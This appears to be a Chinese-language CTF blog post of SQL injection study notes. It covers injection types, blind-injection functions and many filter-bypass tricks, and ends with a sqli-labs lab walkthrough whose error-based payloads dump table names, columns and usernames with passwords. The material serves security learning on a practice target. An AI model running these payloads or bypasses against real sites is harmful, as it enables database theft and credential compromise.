---
title: SQL-inject
categories:
  - CTF
  - web
date: 2023-07-29 21:59:22
tags: 网络攻防
---

## SQL注入

在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。

<!--more-->

## 注释符号

这些东西放在SQL注入语句的末尾用来把原语句中我们不需要的东西注释掉。

```
原语句：select * from public limit 0,1
--+
	select * from users --+ public limit 0,1
#
	select * from users # public limit 0,1
```

## SQL常见注入

[sql注入基础原理](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%7B%22request%5Fid%22%3A%22169076907116800227414127%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=169076907116800227414127&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v91^control_2,239^v12^control2&utm_term=SQL注入&spm=1018.2226.3001.4187)

最重要的就是找到注入点，并根据信息判断是什么类型的注入，以及如何闭合语句。其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分**常用**的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。

- 数字型注入

  输入的参数为整型时，php文件中SQL语句大致如下：

  ```
  select * from <表名> where id = x
  ```

  这种类型使用`id = 1`与`id = 2 - 1`回显是否相同，或者使用经典的 `and 1=1` 和 `and 1=2` 来判断。

  URL 地址中输入 `http://xxx/abc.php?id= x and 1=1` 页面依旧运行正常，继续进行下一步。

  URL 地址中继续输入 `http://xxx/abc.php?id= x and 1=2` 页面运行错误，则说明此 Sql 注入为数字型注入。

- 字符型注入

  当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：

  ```
  select * from <表名> where id = 'x'
  ```

  这种类型我们同样可以使用`id = 1`与`id = 2 - 1`回显是否相同或者 `and '1'='1` 和 and `'1'='2`来判断：

  URL 地址中输入 http://xxx/abc.php?id= x' and '1'='1 页面运行正常，继续进行下一步。
  URL地址中继续输入 http://xxx/abc.php?id= x' and '1'='2 页面运行错误，则说明此 SQL 注入为字符型注入。

  > 闭合：
  >
  > 有些SQL注入需要闭合前面的括号等。

- 宽字节注入

  在GBK编码下且存在`\`等过滤时可加入`%df`绕过，详情见下文。

- `insert, delete`等SQL语句注入

  无非是吧`select`换成其他SQL语句关键字。

- `http header`注入

  可以在`User-Agent`、`Cookies`等部分寻找注入点。

- 盲注

  sql盲注时常用到以下函数：

  ```
  -------------------------------------------------------------------------------
  substr()
  substr(string, pos, len):从pos开始，取长度为len的子串
  substr(string, pos):从pos开始，取到string的最后
  -------------------------------------------------------------------------------
  substring()
  用法和substr()一样
  -------------------------------------------------------------------------------
  mid()
  用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的
  -------------------------------------------------------------------------------
  left()和right()
  left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串
  -------------------------------------------------------------------------------
  limit
  limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始
  -------------------------------------------------------------------------------
  ascii()和char()
  ascii(char):把char这个字符转为ascii码
  char(ascii_int):和ascii()的作用相反，将ascii码转字符
  ```

  - 布尔盲注
  - 时间盲注

## 绕过方法

[sql注入绕过方法总结](https://blog.csdn.net/huanghelouzi/article/details/82995313)

如果SQL语句的关键字被过滤，我们可以采取一些方法绕过过滤。

- #### 大小写绕过

  常用于 `waf`的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。

- #### 改写关键字绕过

  有些题目中`waf`把关键字用`replace()`等置换为空，这时候只要适当构造就可以绕过，例如`selselectect`。

  而像`OR,AND`这些则使用`||,&&`替换。

  > OR: ||
  >
  > AND: &&
  >
  > XOR: |
  >
  > NOT: !

- #### 特殊编码绕过

  - 十六进制绕过

    将关键字改成十六进制表示即可

  - ASCII

    `Test`等价`于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`

    > 新版MySQL可能用不了

- #### 空格过滤绕过

  ```
  /**/
  ()
  %0a    # 其实就是回车
  %a0	   # 空格
  %0c	   # 新的一页
  %0d    # return
  `
  tab(%09 水平 %0b垂直)
  两个空格
  ```

- #### 过滤`=`绕过

  - 不加`通配符`的`like`执行的效果和`=`一致，所以可以用来绕过。

  - `rlike`：模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来。用来取代`=`时，`rlike`的用法和上面的`like`一样，没有通配符效果和`=`一样。

  - `regexp`：MySQL中用来进行正则表达式匹配

  - 使用大于小于号

    ```
    select * from users where id > 1 and id <3 # 即id = 2
    ```

  - `<>`等价于`!=`，所以前面再加一个`!`就是`=`了

- #### 大于小于号滤过

  在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。如果过滤了大小于号，可以使用以下的关键字来绕过。

  - `great(n1,n2,n3,...)`：返回n中的最大值。
  - `least(n1,n2,n3,...)`：返回n中的最小值.
  - `strcmp(str1,str2)`：若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1。

  - `in`关键字：

    ```
    mysql> select * from users where id = 1 and substr(username,1,1) in ('t');
    +----+----------+----------+
    | id | username | password |
    +----+----------+----------+
    |  1 | test1    | pass     |
    +----+----------+----------+
    1 row in set (0.01 sec)
    
    mysql> select * from users where id = 1 and substr(username,1,1) in ('y');
    Empty set (0.00 sec)
    
    ```

  - `between a and b `：范围在a到b之间。

    使用其判断相等：`between a and a`。

- #### 过滤引号绕过

  - 十六进制

    ```
    select column_name  from information_schema.tables where table_name=0x7573657273;
    ```

  - 宽字节

    ```
    # 过滤单引号时（GBK编码下）
    %bf%27 %df%27 %aa%27   # 这里会与过滤符号生成一个汉字
    ```

- #### 过滤逗号绕过

  - `from <pos> for <len>`

    ```
    mysql> select substr("string",1,3);
    +----------------------+
    | substr("string",1,3) |
    +----------------------+
    | str                  |
    +----------------------+
    
    # 替换后
    mysql> select substr("string" from 1 for 3);
    +-------------------------------+
    | substr("string" from 1 for 3) |
    +-------------------------------+
    | str                           |
    +-------------------------------+
    1 row in set (0.00 sec)
    
    # SQL盲注
    mysql> select ascii(substr(database() from 1 for 1)) > 120;
    +----------------------------------------------+
    | ascii(substr(database() from 1 for 1)) > 120 |
    +----------------------------------------------+
    |                                            0 |
    +----------------------------------------------+
    1 row in set (0.00 sec)
    
    mysql> select ascii(substr(database() from 1 for 1)) > 110;
    +----------------------------------------------+
    | ascii(substr(database() from 1 for 1)) > 110 |
    +----------------------------------------------+
    |                                            1 |
    +----------------------------------------------+
    
    ```

  - `join`关键字绕过

    ```
    mysql> select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;
    +----+----------+----------+
    | id | username | password |
    +----+----------+----------+
    |  1 | test1    | pass     |
    |  2 | user2    | pass1    |
    |  3 | test3    | pass1    |
    |  1 | 2        | 3        |
    +----+----------+----------+
    
    union select * from (select 1)a join (select 2)b join(select 3)c
    等价于
    union select 1,2,3
    ```

    > **多表关联 JOIN**
    >
    > JOIN 用于根据两个或多个表中的列之间的关系，从这些表中查询数据。
    >
    > 有时为了得到完整的结果，我们需要从两个或更多的表中获取结果。我们就需要执行 join。
    >
    > 数据库中的表可通过键将彼此联系起来。主键（Primary Key）是一个列，在这个列中的每一行的值都是唯一的。在表中，每个主键的值都是唯一的。这样做的目的是在不重复每个表中的所有数据的情况下，把表间的数据交叉捆绑在一起。

  - `like`关键字

    适用于`substr()`等提取子串的函数中的逗号。

    ```
    mysql> select ascii(substr(user(),1,1))=114;
    +-------------------------------+
    | ascii(substr(user(),1,1))=114 |
    +-------------------------------+
    |                             1 |
    +-------------------------------+
    
    mysql> select user() like "r%";
    +------------------+
    | user() like "r%" |
    +------------------+
    |                1 |
    +------------------+
    
    mysql> select user() like "t%";
    +------------------+
    | user() like "t%" |
    +------------------+
    |                0 |
    +------------------+
    
    ```

  - `offset`关键字

    适用于`limit`中的逗号被过滤的情况。
    `limit 2,1`等价于`limit 1 offset 2`。

- #### 过滤函数绕过

  - `sleep()`更换为`benchmark()`

    ```
    # MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 
    参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
    mysql> select 12,23 and benchmark(1000000000,1);
    +----+--------------------------------+
    | 12 | 23 and benchmark(1000000000,1) |
    +----+--------------------------------+
    | 12 |                              0 |
    +----+--------------------------------+
    1 row in set (4.61 sec)
    ```

  - `ascii()`更换为`hex(), bin()`

    替代之后再使用对应的进制转string即可

  - `group_concat()`替换为`concat_ws()`

    ```
    mysql> select group_concat("str1","str2");
    +-----------------------------+
    | group_concat("str1","str2") |
    +-----------------------------+
    | str1str2                    |
    +-----------------------------+
    1 row in set (0.00 sec)
    
    #第一个参数为分隔符
    mysql> select concat_ws(",","str1","str2");
    +------------------------------+
    | concat_ws(",","str1","str2") |
    +------------------------------+
    | str1,str2                    |
    +------------------------------+
    ```

  - `substr(), substring(), mid()`可以相互取代, 取子串的函数还有`left(), right()`
  - `user() --> @@user`、`datadir–>@@datadir`
  - `ord()–>ascii()`：这两个函数在处理英文时效果一样，但是处理中文等时不一致。

> 例如sqli-labs的less-26，将逻辑运算符，注释符以及空格给过滤了，我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用&&和||替换。报错注入空格使用比较少所以我们可以使用报错注入。
>
> 我们输入
>
> ```
> ?id=0%27union%20select%201,group_concat(username,0x7e,password),3%20from%20users%20%23
> ```
>
> 发现出现下面的情况：
>
> ![](https://pic.imgdb.cn/item/64c5d66a1ddac507ccf6f4cd.png)
>
> 根据给的hint，我们尝试绕过过滤。
>
> ```
> ?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0   #  爆表
>  
> ?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0     #  爆字段
>  
> ?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0   #  爆密码账户
> ```

![爆表](https://pic.imgdb.cn/item/64c71f6d1ddac507ccf42fb0.png)

![爆字段](https://pic.imgdb.cn/item/64c71f6d1ddac507ccf43039.png)

![爆账户和密码](https://pic.imgdb.cn/item/64c71f6d1ddac507ccf4305f.png)

> 由于`updatexml()`函数的原因（只显示32位），有时候需要片段截取来获得完整的信息。

### Sqli-labs

一个不错的练习靶场，基本涵盖了所有SQL注入题型。

[详细sqli-labs（1-65）通关讲解](https://blog.csdn.net/dreamthe/article/details/123795302)

